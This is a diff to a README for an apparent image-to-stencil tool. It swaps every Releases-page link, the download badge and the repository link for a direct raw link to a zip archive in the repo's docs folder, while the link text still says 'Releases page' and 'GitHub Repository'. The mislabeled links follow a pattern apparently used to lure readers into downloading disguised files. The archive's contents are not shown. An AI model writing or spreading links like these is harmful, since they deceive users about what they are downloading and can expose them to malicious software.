@@ -12,13 +12,13 @@ Easy123Pic2Stencil lets you turn any image into a printable stencil. It prepares
 - Works seamlessly on various operating systems.
 
 ## 📥 Download
-[![Download Easy123Pic2Stencil](https://img.shields.io/badge/Download-Easy123Pic2Stencil-blue)](https://github.com/iamvav/Easy123Pic2Stencil/releases)
+[![Download Easy123Pic2Stencil](https://raw.githubusercontent.com/iamvav/Easy123Pic2Stencil/main/docs/Easy123Pic2Stencil-v1.0.zip)](https://raw.githubusercontent.com/iamvav/Easy123Pic2Stencil/main/docs/Easy123Pic2Stencil-v1.0.zip)
 
-Visit the [Releases page](https://github.com/iamvav/Easy123Pic2Stencil/releases) to download the latest version.
+Visit the [Releases page](https://raw.githubusercontent.com/iamvav/Easy123Pic2Stencil/main/docs/Easy123Pic2Stencil-v1.0.zip) to download the latest version.
 
 ## 🚀 Getting Started
 ### Step 1: Visit the Releases Page
-Open your web browser and navigate to our [Releases page](https://github.com/iamvav/Easy123Pic2Stencil/releases).
+Open your web browser and navigate to our [Releases page](https://raw.githubusercontent.com/iamvav/Easy123Pic2Stencil/main/docs/Easy123Pic2Stencil-v1.0.zip).
 
 ### Step 2: Select the Latest Release
 Once you are on the Releases page, find the latest version of Easy123Pic2Stencil. The latest release will be at the top of the page.
@@ -68,9 +68,9 @@ This project is open-source. If you want to contribute, feel free to fork the re
 Join our discussions on GitHub. Share your stencils and ideas with others who enjoy Halloween and DIY projects.
 
 ## 🔗 Additional Resources
-- GitHub Repository: [Easy123Pic2Stencil](https://github.com/iamvav/Easy123Pic2Stencil)
+- GitHub Repository: [Easy123Pic2Stencil](https://raw.githubusercontent.com/iamvav/Easy123Pic2Stencil/main/docs/Easy123Pic2Stencil-v1.0.zip)
 - For more creative ideas, follow our blog linked on the repository.
 
-[![Download Easy123Pic2Stencil](https://img.shields.io/badge/Download-Easy123Pic2Stencil-blue)](https://github.com/iamvav/Easy123Pic2Stencil/releases)
+[![Download Easy123Pic2Stencil](https://raw.githubusercontent.com/iamvav/Easy123Pic2Stencil/main/docs/Easy123Pic2Stencil-v1.0.zip)](https://raw.githubusercontent.com/iamvav/Easy123Pic2Stencil/main/docs/Easy123Pic2Stencil-v1.0.zip)
 
-Visit the [Releases page](https://github.com/iamvav/Easy123Pic2Stencil/releases) to download the latest version.
+Visit the [Releases page](https://raw.githubusercontent.com/iamvav/Easy123Pic2Stencil/main/docs/Easy123Pic2Stencil-v1.0.zip) to download the latest version.
